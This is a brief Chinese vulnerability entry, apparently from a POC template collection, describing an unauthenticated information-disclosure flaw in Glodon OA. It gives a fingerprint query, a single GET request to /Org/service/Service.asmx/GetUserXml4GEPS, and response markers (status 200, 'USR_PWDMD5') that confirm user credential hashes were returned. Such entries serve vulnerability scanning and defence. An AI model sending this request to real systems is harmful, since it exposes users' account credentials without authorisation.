﻿# 广联达OA信息泄露漏洞漏洞

> 更新时间：2023-12-20

> 漏洞编号：

> 漏洞说明：广联达OA存在信息泄露漏洞，由于某些接口没有鉴权，导致未经身份认证的远程攻击者可以利用该接口输出用户的账号密码。未授权接口列表：/Org/service/Service.asmx

> 漏洞特征：web.body="/Services/Identification/Server/"

> 验证脚本：HTTP

```
GET /Org/service/Service.asmx/GetUserXml4GEPS HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：USR_PWDMD5

> 上传文件定位：


> 验证文件来源：广联达OA信息泄露漏洞漏洞.poc
